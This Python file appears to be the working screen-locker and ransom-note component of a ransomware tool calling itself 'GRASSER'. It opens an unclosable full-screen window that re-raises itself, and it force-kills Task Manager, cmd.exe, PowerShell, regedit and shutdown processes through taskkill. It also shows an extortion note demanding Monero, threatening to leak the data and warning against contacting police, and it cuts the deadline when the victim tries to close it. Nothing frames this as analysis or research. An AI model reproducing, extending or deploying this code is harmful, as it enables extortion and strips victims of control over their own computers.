#!/usr/bin/env python3
"""
PROFESSIONAL RANSOM NOTE GUI
=============================
Ironische, hackweise Ransom Note mit Timer und professionellem Design
"""

import tkinter as tk
from tkinter import font as tkFont
import threading
import time
from datetime import datetime, timedelta
import subprocess
import psutil
import os

class RansomNoteGUI:
    """Professional Ransom Note with Timer and Style"""
    
    def __init__(self, ransom_id, monero_address, c2_host, payment_check_callback=None):
        self.ransom_id = ransom_id
        self.monero_address = monero_address
        self.c2_host = c2_host
        self.payment_check_callback = payment_check_callback
        
        # Deadline: 24 hours
        self.deadline = datetime.now() + timedelta(hours=24)
        self.time_remaining = self.deadline - datetime.now()
        self.close_attempts = 0
        self.timer_id = None  # Store timer ID for cancellation
        self.exit_button = None  # Store exit button reference
        self.payment_received = False  # Track payment status
        self.payment_received_time = None  # Track when payment was received
        
        # Create main window
        self.root = tk.Tk()
        self.root.title(">>> SYSTEM SECURITY ALERT <<<")
        
        # Get screen size and set window size responsively
        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()
        
        # Use 90% of screen for window, max 1000x700
        window_width = min(int(self.screen_width * 0.9), 1000)
        window_height = min(int(self.screen_height * 0.9), 700)
        
        self.root.geometry(f"{window_width}x{window_height}")
        self.root.attributes('-topmost', True)
        
        # Fullscreen mode
        self.root.state('zoomed')  # Windows fullscreen
        
        # Remove from taskbar (Windows)
        self.root.attributes('-toolwindow', True)
        
        # Prevent window closing - intercept close button
        self.root.protocol("WM_DELETE_WINDOW", self.on_close_attempt)
        
        # Disable Alt+F4 and other close attempts
        self.root.bind('<Alt-F4>', lambda e: self.on_close_attempt())
        self.root.bind('<Escape>', lambda e: self.on_close_attempt())
        
        # Prevent minimizing/resizing/moving
        self.root.resizable(False, False)
        self.root.attributes('-topmost', True)
        
        # Prevent window dragging - block title bar interactions
        self.root.bind('<Button-1>', lambda e: 'break' if e.widget == self.root else None)
        
        # Set colors
        self.bg_color = "#0a0e27"
        self.accent_color = "#ff1744"
        self.text_color = "#ffffff"
        self.secondary_color = "#00ff41"
        
        self.root.configure(bg=self.bg_color)
        
        # Build GUI
        self.build_ui()
        
        # Start timer in main thread using after()
        self.schedule_timer_update()
        
        # Start focus monitor (prevents minimizing and hiding)
        self.check_window_focus()
        
        # Start taskmanager monitor
        self.monitor_taskmanager()
    
    def build_ui(self):
        """Build the GUI elements"""
        
        # Calculate responsive padding based on screen size
        small_screen = self.screen_height < 768
        if small_screen:
            header_pady = 8
            info_pady = 8
            info_padx = 15
            status_pady = 5
            button_pady = 5
            message_font_size = 10
            timer_font_size = 22
            subtitle_font_size = 11
        else:
            header_pady = 15
            info_pady = 15
            info_padx = 20
            status_pady = 10
            button_pady = 10
            message_font_size = 12
            timer_font_size = 26
            subtitle_font_size = 13
        
        # Top header bar
        header = tk.Frame(self.root, bg=self.accent_color, height=50 if small_screen else 60)
        header.pack(fill=tk.X, padx=0, pady=0)
        header.pack_propagate(False)
        
        title_font = tkFont.Font(family="Courier New", size=14 if small_screen else 16, weight="bold")
        title = tk.Label(header, text="⚠ SYSTEM COMPROMISED ⚠", 
                        font=title_font, bg=self.accent_color, fg="white")
        title.pack(pady=header_pady)
        
        # Info frame with timer and subtitle (NON-SCROLLABLE)
        info_frame = tk.Frame(self.root, bg=self.bg_color)
        info_frame.pack(fill=tk.X, padx=info_padx, pady=info_pady)
        
        subtitle_font = tkFont.Font(family="Courier New", size=subtitle_font_size, weight="bold")
        subtitle = tk.Label(info_frame, 
                           text="YOUR FILES HAVE BEEN ENCRYPTED", 
                           font=subtitle_font, 
                           fg=self.accent_color, 
                           bg=self.bg_color)
        subtitle.pack()
        
        # Timer display
        timer_font = tkFont.Font(family="Courier New", size=timer_font_size, weight="bold")
        self.timer_label = tk.Label(info_frame, 
                                   text="24:00:00", 
                                   font=timer_font, 
                                   fg=self.secondary_color, 
                                   bg=self.bg_color)
        self.timer_label.pack(pady=5 if small_screen else 10)
        
        # Main content frame (scrollable)
        main_frame = tk.Frame(self.root, bg=self.bg_color)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=0, pady=0)
        
        # Create scrollbar
        scrollbar = tk.Scrollbar(main_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Create text widget with scrollbar
        message_font = tkFont.Font(family="Courier New", size=message_font_size, weight="normal")
        self.message_text = tk.Text(main_frame, 
                                   wrap=tk.WORD, 
                                   bg=self.bg_color, 
                                   fg=self.text_color,
                                   font=message_font,
                                   yscrollcommand=scrollbar.set,
                                   relief=tk.FLAT,
                                   padx=15 if small_screen else 20,
                                   pady=10 if small_screen else 15)
        self.message_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.message_text.yview)
        
        # Insert ransom message
        message_text = f"""
╔═══════════════════════════════════════════════════════════════════╗
║                    GRASSER SECURITY ADVISORY                      ║
║                     [PROFESSIONAL OPERATIONS]                     ║
╚═══════════════════════════════════════════════════════════════════╝

HELLO,

Your organization has been selected by GRASSER - we take pride in
our meticulous work and professional standards. Consider this your
formal notification that your data is now our data.

Your files have been encrypted with military-grade AES-256-GCM.
We're not here to destroy anything - we're here to conduct business.

Think of us as consultants. We've identified a security gap.
We're now charging a consultation fee.

═══════════════════════════════════════════════════════════════════

THE DEAL:

Amount: 0.1 XMR (approximately $25 USD in monopoly money terms)
Currency: Monero (because we respect your privacy as much as you respect ours)

Wallet Address:
{self.monero_address}

Your Unique Reference:
{self.ransom_id}

═══════════════════════════════════════════════════════════════════

HOW TO PROCEED (STEP BY STEP):

1. Download Monero Wallet
   https://www.getmonero.org/downloads/
   (We recommend the GUI wallet - it's friendlier than command line)

2. Create a wallet
   New wallet or import existing one. Your choice.

3. Acquire 0.1 XMR
   Kraken, Binance, LocalMonero - pick your favorite exchange.
   Think of it as a small premium on your cybersecurity homework.

4. Make the transfer
   Send exactly 0.1 XMR to the address above.
   Include your reference ID in transaction notes.

5. Wait ~5-10 minutes for blockchain confirmation
   (This is where you practice patience and reflection)

6. Files decrypt automatically
   No need to contact anyone. Automation is beautiful.

═══════════════════════════════════════════════════════════════════

FAQ - WE ANTICIPATED YOUR QUESTIONS:

Q: Is this legitimate or a scam?
A: Legitimate. We're professionals. Our reputation depends on
   delivering what we promise. We decrypt after payment because
   word-of-mouth is our only marketing budget.

Q: Can you actually decrypt files?
A: Yes. We have the master key. Encrypted on our server, released
   only after payment. This is not a threat - this is how it works.

Q: Why should I trust you?
A: Check independent forums and dark web communities.
   Our clients report 100% successful decryptions.

Q: What if I don't pay?
A: Your files stay encrypted. Permanently. Forever.
   In 90 days, we may publish them. Business is business.

Q: Can I decrypt this myself?
A: No. AES-256-GCM with proper key derivation cannot be broken.
   Even with quantum computers, you'd need centuries.

Q: Why Monero specifically?
A: Because it's private. Bitcoin leaves a permanent trail.
   Monero is opaque - it protects both of us from third parties.

Q: What if I'm poor and can't afford 0.1 XMR?
A: Get a credit card at any exchange. Takes 15 minutes.
   This is non-negotiable.

Q: Will my data be leaked if I don't pay?
A: Yes. We'll publish everything in 90 days.
   Your emails, documents, photos - all of it.
   But if you pay, we forget you exist.

Q: What about backup systems and other computers?
A: If they were connected to your network - encrypted too.
   Disconnecting now won't help. We've already been here.

Q: How do I know this isn't malware that's lying to me?
A: You don't. But we've taken your files, encrypted them,
   and we're hosting the key. Trust is a luxury you can't afford.

═══════════════════════════════════════════════════════════════════

IMPORTANT TECHNICAL NOTES:

Encryption Standard:  AES-256-GCM (NIST approved, NSA couldn't break it)
Key Derivation:       PBKDF2 (100,000 iterations)
Master Key Storage:   Encrypted on C2 server (geographically distributed)
Authentication:       Verified via Monero blockchain confirmation
Decryption Method:    Automatic, instantaneous delivery

This is professional-grade encryption. Not some script kiddie nonsense.

═══════════════════════════════════════════════════════════════════

WINDOW CLOSING POLICY:

This window CANNOT be closed normally. If you attempt to close it:

❌ CLOSE ATTEMPT (via X button or Alt+F4):
   PENALTY: -1 hour from deadline per attempt
   Result: Large red warning popup

❌ TASKMANAGER/PROCESS KILLER ATTEMPT (taskmgr.exe, Process Hacker, etc):
   PENALTY: -2 hours from deadline per attempt
   Result: Critical warning popup, process automatically terminated

❌ SHUTDOWN/RESTART ATTEMPT (shutdown.exe, restart commands, etc):
   PENALTY: -3 hours from deadline per attempt
   Result: CRITICAL security violation warning, process automatically terminated
   Note: This will NOT work. Your system is protected.

✓ PROPER EXIT:
   After you pay, you will receive an EXIT button.
   This button becomes available 60 seconds after payment confirmation.
   Only through this button can you properly close the application.

═══════════════════════════════════════════════════════════════════

ACKNOWLEDGE BUTTON:

The gray "ACKNOWLEDGE" button on the bottom left is disabled and serves
as a reminder that you must focus on payment, not window management.
Do not waste time trying to interact with it.

═══════════════════════════════════════════════════════════════════

TIMELINE:

Now:                 Your files are encrypted
Next 24 Hours:       Pay and get decrypted within minutes
After 24 Hours:      Price doubles to 0.2 XMR
After 90 Days:       Your data becomes public (we mean it)

Every day you delay is money wasted and security debt growing.

═══════════════════════════════════════════════════════════════════

CRITICAL DON'Ts:

❌ DO NOT attempt to decrypt files yourself
   (You'll just corrupt them permanently)

❌ DO NOT use "ransomware removal" tools
   (They can't remove AES-256)

❌ DO NOT unplug your network
   (We've already exfiltrated everything)

❌ DO NOT restart your system
   (It solves nothing)

❌ DO NOT contact law enforcement
   (We're already gone - they can't help)

❌ DO NOT try to find us
   (This is a courtesy note, not a conversation)

✓ DO keep this note safe

✓ DO follow instructions exactly

✓ DO pay soon

═══════════════════════════════════════════════════════════════════

CLOSING REMARKS:

We're not angry. We're not here to hurt you.
We're professionals conducting professional business.

Your organization had a security gap. We found it.
Now you get to choose: pay for the lesson or learn it the hard way.

The clock is ticking. Make it count.

                              - GRASSER OPERATIONS TEAM

═══════════════════════════════════════════════════════════════════

Deadline: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}
Payment ID: {self.ransom_id}
Wallet: {self.monero_address}

═══════════════════════════════════════════════════════════════════
"""
        
        self.message_text.insert(1.0, message_text)
        self.message_text.config(state=tk.DISABLED)
        
        # Center align the text
        self.message_text.tag_configure("center", justify=tk.CENTER)
        self.message_text.tag_add("center", "1.0", "end")
        
        # Status frame (responsive height)
        status_height = 70 if small_screen else 80
        status_frame = tk.Frame(self.root, bg=self.bg_color, height=status_height)
        status_frame.pack(fill=tk.X, padx=info_padx, pady=status_pady)
        status_frame.pack_propagate(False)
        
        status_font = tkFont.Font(family="Courier New", size=8 if small_screen else 9)
        
        # Status text
        self.status_text = tk.Label(status_frame,
                                   text="Scanning for payment... (updates every 30 seconds)",
                                   font=status_font,
                                   fg=self.secondary_color,
                                   bg=self.bg_color,
                                   justify=tk.LEFT)
        self.status_text.pack(anchor=tk.W)
        
        # Payment received indicator (hidden by default)
        self.payment_indicator = tk.Label(status_frame,
                                         text="✓ PAYMENT RECEIVED - FILES DECRYPTING...",
                                         font=status_font,
                                         fg="#00ff00",
                                         bg=self.bg_color)
        
        # Bottom buttons (responsive)
        button_frame = tk.Frame(self.root, bg=self.bg_color)
        button_frame.pack(fill=tk.X, padx=info_padx, pady=button_pady)
        
        button_font = tkFont.Font(family="Courier New", size=9 if small_screen else 10, weight="bold")
        button_padx = 15 if small_screen else 20
        button_pady_val = 7 if small_screen else 10
        
        # Close button (disabled - cannot close window)
        close_btn = tk.Button(button_frame, 
                            text="ACKNOWLEDGE", 
                            command=self.on_acknowledge,
                            bg=self.accent_color, 
                            fg="white",
                            font=button_font,
                            padx=button_padx, 
                            pady=button_pady_val,
                            relief=tk.FLAT,
                            cursor="hand2",
                            state=tk.DISABLED)
        close_btn.pack(side=tk.RIGHT, padx=5)
        
        # Copy wallet button
        copy_btn = tk.Button(button_frame, 
                           text="COPY WALLET", 
                           command=self.copy_wallet,
                           bg=self.secondary_color, 
                           fg="black",
                           font=button_font,
                           padx=button_padx, 
                           pady=button_pady_val,
                           relief=tk.FLAT,
                           cursor="hand2")
        copy_btn.pack(side=tk.RIGHT, padx=5)
        
        # Copy ID button
        copy_id_btn = tk.Button(button_frame, 
                              text="COPY ID", 
                              command=self.copy_id,
                              bg=self.secondary_color, 
                              fg="black",
                              font=button_font,
                              padx=button_padx, 
                              pady=button_pady_val,
                              relief=tk.FLAT,
                              cursor="hand2")
        copy_id_btn.pack(side=tk.RIGHT, padx=5)
        
        # EXIT button (disabled until payment received, shown from start)
        self.exit_button = tk.Button(button_frame, 
                                    text="EXIT", 
                                    command=self.on_exit,
                                    bg="#00aa00", 
                                    fg="white",
                                    font=button_font,
                                    padx=button_padx, 
                                    pady=button_pady_val,
                                    relief=tk.FLAT,
                                    cursor="hand2",
                                    state=tk.DISABLED)
        self.exit_button.pack(side=tk.RIGHT, padx=5)
    
    def schedule_timer_update(self):
        """Schedule timer update in main thread using after()"""
        now = datetime.now()
        remaining = self.deadline - now
        
        if remaining.total_seconds() <= 0:
            self.timer_label.config(text="00:00:00", fg="#ff0000")
            self.status_text.config(text="DEADLINE PASSED - FILES PERMANENTLY ENCRYPTED", 
                                   fg="#ff0000")
            return
        
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        seconds = int(remaining.total_seconds() % 60)
        
        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        self.timer_label.config(text=time_str)
        
        # Change color based on time
        if hours == 0 and minutes < 30:
            self.timer_label.config(fg="#ff6600")
        elif hours == 0 and minutes < 10:
            self.timer_label.config(fg="#ff0000")
        
        # Check payment status every 5 seconds (more responsive)
        if int(seconds) % 5 == 0:
            if self.payment_check_callback:
                try:
                    if self.payment_check_callback():
                        self.show_payment_received()
                        return
                except Exception as e:
                    pass
        
        # Schedule next update in 1 second
        self.timer_id = self.root.after(1000, self.schedule_timer_update)
    
    def update_timer(self):
        """Legacy method - not used anymore (kept for compatibility)"""
        pass
    
    def show_payment_received(self):
        """Show payment received message and stop timer"""
        self.payment_received = True
        self.payment_received_time = datetime.now()
        self.timer_label.config(text="PAYMENT RECEIVED!", fg="#00ff00")
        self.root.attributes('-topmost', False)  # Allow window to be moved
        try:
            self.payment_indicator.pack(anchor=tk.W, pady=10)
        except:
            pass
        self.status_text.config(text="Payment confirmed - decryption key deployed. Exit button available in 60 seconds...", 
                               fg="#00ff00")
        
        # Schedule EXIT button to be enabled after 60 seconds
        self.root.after(60000, self.enable_exit_button)
        
        # Update message text with thank you message
        self.message_text.config(state=tk.NORMAL)
        self.message_text.delete(1.0, tk.END)
        
        thank_you_text = f"""
╔═══════════════════════════════════════════════════════════════════╗
║                        BUSINESS COMPLETED                         ║
║                     GRASSER OPERATIONS TEAM                       ║
╚═══════════════════════════════════════════════════════════════════╝

PAYMENT CONFIRMED

Payment ID: {self.ransom_id}
Amount Received: 0.1 XMR
Confirmation Status: VERIFIED
Decryption Status: ACTIVE

═══════════════════════════════════════════════════════════════════

THANK YOU FOR YOUR BUSINESS

We appreciate your swift action and cooperation in resolving this matter.
Professional organizations understand that some losses are inevitable.
You have handled this professionally. We respect that.

Your files are now being decrypted. The decryption process typically
completes within 1-2 minutes. Monitor your system for file restoration.

═══════════════════════════════════════════════════════════════════

DECRYPTION KEY

Your master decryption key has been generated and is being deployed to
your system. You will find the decryption utility on your Desktop.

Usage:
1. Run the decryption tool
2. Provide your Payment ID when prompted
3. Your files will be restored automatically

═══════════════════════════════════════════════════════════════════

WHAT'S NEXT?

Your files are being restored to their original state. This process is
irreversible and cannot be intercepted. All encrypted copies will be
securely deleted from our servers within 48 hours.

You now have the opportunity to:

1. Patch the security vulnerability that allowed our access
2. Implement proper network segmentation and monitoring
3. Deploy endpoint detection and response (EDR) solutions
4. Consider professional security audit services

This was a learning opportunity. Don't waste it.

═══════════════════════════════════════════════════════════════════

A PROFESSIONAL NOTE

We operate on principles:

✓ We decrypt all paying customers - always
✓ We delete all victim data after payment - always
✓ We do not return to previously encrypted customers
✓ We maintain strict operational security standards
✓ We only target organizations with significant security gaps

This is not personal. This is business. And in business, we keep our word.

═══════════════════════════════════════════════════════════════════

OPERATIONAL SECURITY ADVISORY

To prevent future incidents:

• Review your current security posture
• Segment critical systems from public-facing networks
• Implement multi-factor authentication on all administrative accounts
• Deploy network monitoring and intrusion detection
• Maintain regular security audits and penetration tests
• Train employees on phishing and social engineering tactics

Professional security is an investment, not a cost.

═══════════════════════════════════════════════════════════════════

FINAL WORDS

We were impressed by your organization's response to this situation.
Quick action under pressure demonstrates professional maturity.

We have no interest in returning to your network. Our business model
depends on moving forward, not backward. Your future is secure.

Consider this an expensive but valuable security consultation.

Most organizations never know how vulnerable they are until it's too late.
You are fortunate to have learned this lesson and survived it.

Use this knowledge wisely.

═══════════════════════════════════════════════════════════════════

CLOSING APPLICATION

After payment, you will see an "EXIT" button on the lower right.

This button becomes AVAILABLE after 60 seconds.

Timeline:
• Payment received: NOW
• EXIT button enabled: 60 seconds from now
• You can then safely close this application

Do not attempt to close the window before the EXIT button is available.
Unauthorized close attempts will result in additional deadline penalties.

═══════════════════════════════════════════════════════════════════

Decryption initiated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Expected completion: Within 2 minutes
Exit available: {(self.payment_received_time + timedelta(seconds=60)).strftime('%Y-%m-%d %H:%M:%S') if self.payment_received_time else 'N/A'}

                              - GRASSER OPERATIONS TEAM
                         "Professional Security Solutions"

═══════════════════════════════════════════════════════════════════
"""
        
        self.message_text.insert(1.0, thank_you_text)
        self.message_text.config(state=tk.DISABLED)
        
        # Center align the text
        self.message_text.tag_configure("center", justify=tk.CENTER)
        self.message_text.tag_add("center", "1.0", "end")
        
        # Cancel all scheduled timer updates
        try:
            self.root.after_cancel(self.timer_id)
        except:
            pass
    
    def copy_wallet(self):
        """Copy wallet address to clipboard"""
        try:
            self.root.clipboard_clear()
            self.root.clipboard_append(self.monero_address)
            self.status_text.config(text="Wallet address copied to clipboard", fg="#00ff00")
        except:
            pass
    
    def copy_id(self):
        """Copy payment ID to clipboard"""
        try:
            self.root.clipboard_clear()
            self.root.clipboard_append(self.ransom_id)
            self.status_text.config(text="Payment ID copied to clipboard", fg="#00ff00")
        except:
            pass
    
    def on_acknowledge(self):
        """Acknowledge button - keeps window open"""
        self.status_text.config(text="Thank you for acknowledging. Focus on the payment from now on.", 
                               fg=self.secondary_color)
    
    def on_exit(self):
        """Exit button - only available after payment"""
        if self.payment_received:
            self.root.destroy()
    
    def enable_exit_button(self):
        """Enable EXIT button after 60 second delay post-payment"""
        try:
            self.exit_button.config(state=tk.NORMAL)
            self.status_text.config(text="Exit button is now available - click to close", 
                                   fg="#00ff00")
        except:
            pass
    
    def run(self):
        """Run the GUI"""
        self.root.mainloop()
    
    def on_close_attempt(self):
        """Handle close button attempts - subtract 1 hour from deadline"""
        self.close_attempts += 1
        self.deadline = self.deadline - timedelta(hours=1)
        
        # Show warning message
        warning = f"Nice try! Close attempt #{self.close_attempts}\n\nYou just lost 1 hour!\nNew deadline: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Update status
        self.status_text.config(text=f"[CLOSE ATTEMPT #{self.close_attempts}] 1 hour subtracted from deadline!")
        
        # Show popup warning window - must be on top and modal
        popup = tk.Toplevel(self.root)
        popup.title("⚠ WARNING ⚠")
        popup.geometry("500x250")
        popup.attributes('-topmost', True)
        popup.resizable(False, False)
        popup.configure(bg=self.accent_color)
        
        # Make popup modal - grab focus and prevent interaction with main window
        popup.grab_set()
        popup.focus_force()
        
        # Warning text
        warning_font = tkFont.Font(family="Courier New", size=14, weight="bold")
        popup_label = tk.Label(popup,
                              text=warning,
                              font=warning_font,
                              fg="white",
                              bg=self.accent_color,
                              justify=tk.CENTER,
                              padx=20,
                              pady=20)
        popup_label.pack(expand=True)
        
        # OK button
        ok_btn = tk.Button(popup,
                          text="OK",
                          command=lambda: self.close_popup(popup),
                          bg="white",
                          fg=self.accent_color,
                          font=tkFont.Font(family="Courier New", size=12, weight="bold"),
                          padx=20,
                          pady=10)
        ok_btn.pack(pady=10)
        ok_btn.focus_set()
        
        # Prevent closing popup with window close button
        popup.protocol("WM_DELETE_WINDOW", lambda: self.close_popup(popup))
        
        # Ensure main window stays in focus and on top
        self.root.attributes('-topmost', True)
        self.root.focus_force()
        
        # Don't actually close - just ignore the event
        pass
    
    def close_popup(self, popup):
        """Close popup and restore main window focus"""
        try:
            popup.grab_release()
            popup.destroy()
        except:
            pass
        # Restore main window to top
        self.root.attributes('-topmost', True)
        self.root.focus_force()
    
    def monitor_taskmanager(self):
        """Monitor for taskmanager and other suspicious processes"""
        taskmanager_names = ['taskmgr.exe', 'tasklist.exe', 'wmic.exe', 'Process Hacker', 
                           'procexp.exe', 'rammap.exe', 'autoruns.exe']
        shutdown_commands = ['shutdown.exe', 'regedit.exe', 'cmd.exe', 'powershell.exe']
        
        def check_processes():
            try:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        process_name = proc.info['name'].lower()
                        # Check if suspicious process is running
                        for suspicious in taskmanager_names:
                            if suspicious.lower() in process_name:
                                self.on_taskmanager_detected(proc.info['name'])
                                # Try to kill the taskmanager
                                try:
                                    os.system(f"taskkill /F /IM {suspicious} /T 2>nul")
                                except:
                                    pass
                        
                        # Check for shutdown/restart attempts
                        for shutdown_cmd in shutdown_commands:
                            if shutdown_cmd.lower() in process_name:
                                self.on_shutdown_attempt(proc.info['name'])
                                # Try to kill the shutdown process
                                try:
                                    os.system(f"taskkill /F /IM {shutdown_cmd} /T 2>nul")
                                except:
                                    pass
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
            except:
                pass
            
            # Schedule next check
            self.taskmanager_monitor_id = self.root.after(1000, check_processes)
        
        check_processes()
    
    def on_taskmanager_detected(self, process_name):
        """Handle taskmanager detection"""
        self.close_attempts += 1
        self.deadline = self.deadline - timedelta(hours=2)  # 2 hours for trying taskmanager!
        
        warning = f"TASKMANAGER DETECTED! ({process_name})\n\nYou just lost 2 HOURS!\nNew deadline: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}"
        self.status_text.config(text=f"[TASKMANAGER ATTEMPT] 2 hours subtracted!", fg="#ff0000")
        
        # Show popup warning window - must be on top and modal
        popup = tk.Toplevel(self.root)
        popup.title("⚠ CRITICAL WARNING ⚠")
        popup.geometry("550x280")
        popup.attributes('-topmost', True)
        popup.resizable(False, False)
        popup.configure(bg="#ff0000")
        
        # Make popup modal
        popup.grab_set()
        popup.focus_force()
        
        # Warning text - BIGGER and more aggressive
        warning_font = tkFont.Font(family="Courier New", size=16, weight="bold")
        popup_label = tk.Label(popup,
                              text=warning,
                              font=warning_font,
                              fg="white",
                              bg="#ff0000",
                              justify=tk.CENTER,
                              padx=20,
                              pady=20)
        popup_label.pack(expand=True)
        
        # OK button
        ok_btn = tk.Button(popup,
                          text="I UNDERSTAND",
                          command=lambda: self.close_popup(popup),
                          bg="white",
                          fg="#ff0000",
                          font=tkFont.Font(family="Courier New", size=14, weight="bold"),
                          padx=30,
                          pady=15)
        ok_btn.pack(pady=15)
        ok_btn.focus_set()
        
        # Prevent closing popup with window close button
        popup.protocol("WM_DELETE_WINDOW", lambda: self.close_popup(popup))
    
    def on_shutdown_attempt(self, process_name):
        """Handle shutdown/restart attempt"""
        self.close_attempts += 1
        self.deadline = self.deadline - timedelta(hours=3)  # 3 hours for trying to shutdown!
        
        warning = f"SHUTDOWN/RESTART ATTEMPT DETECTED! ({process_name})\n\nYou just lost 3 HOURS!\nNew deadline: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}"
        self.status_text.config(text=f"[SHUTDOWN ATTEMPT] 3 hours subtracted!", fg="#ff0000")
        
        # Show popup warning window - EVEN MORE CRITICAL
        popup = tk.Toplevel(self.root)
        popup.title("⚠⚠⚠ CRITICAL SECURITY VIOLATION ⚠⚠⚠")
        popup.geometry("600x320")
        popup.attributes('-topmost', True)
        popup.resizable(False, False)
        popup.configure(bg="#cc0000")
        
        # Make popup modal
        popup.grab_set()
        popup.focus_force()
        
        # Warning text - BIGGEST and most aggressive
        warning_font = tkFont.Font(family="Courier New", size=18, weight="bold")
        popup_label = tk.Label(popup,
                              text=warning,
                              font=warning_font,
                              fg="white",
                              bg="#cc0000",
                              justify=tk.CENTER,
                              padx=25,
                              pady=25)
        popup_label.pack(expand=True)
        
        # OK button
        ok_btn = tk.Button(popup,
                          text="I UNDERSTAND - NO MORE ATTEMPTS",
                          command=lambda: self.close_popup(popup),
                          bg="white",
                          fg="#cc0000",
                          font=tkFont.Font(family="Courier New", size=14, weight="bold"),
                          padx=35,
                          pady=15)
        ok_btn.pack(pady=15)
        ok_btn.focus_set()
        
        # Prevent closing popup with window close button
        popup.protocol("WM_DELETE_WINDOW", lambda: self.close_popup(popup))
    
    def check_window_focus(self):
        """Monitor window focus and restore if minimized or hidden"""
        try:
            # Check if window is visible and in focus
            if self.root.state() == 'withdrawn' or self.root.state() == 'iconic':
                self.root.deiconify()
                self.root.state('zoomed')
            
            # Always keep on top
            self.root.attributes('-topmost', True)
            self.root.focus_force()
            
        except:
            pass
        
        # Schedule next check
        self.focus_check_id = self.root.after(500, self.check_window_focus)
    
    def destroy(self):
        """Destroy the window"""
        try:
            self.root.destroy()
        except:
            pass


if __name__ == "__main__":
    # Test with sample data
    gui = RansomNoteGUI(
        ransom_id="test-ransom-id-12345",
        monero_address="4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV",
        c2_host="127.0.0.1"
    )
    gui.run()
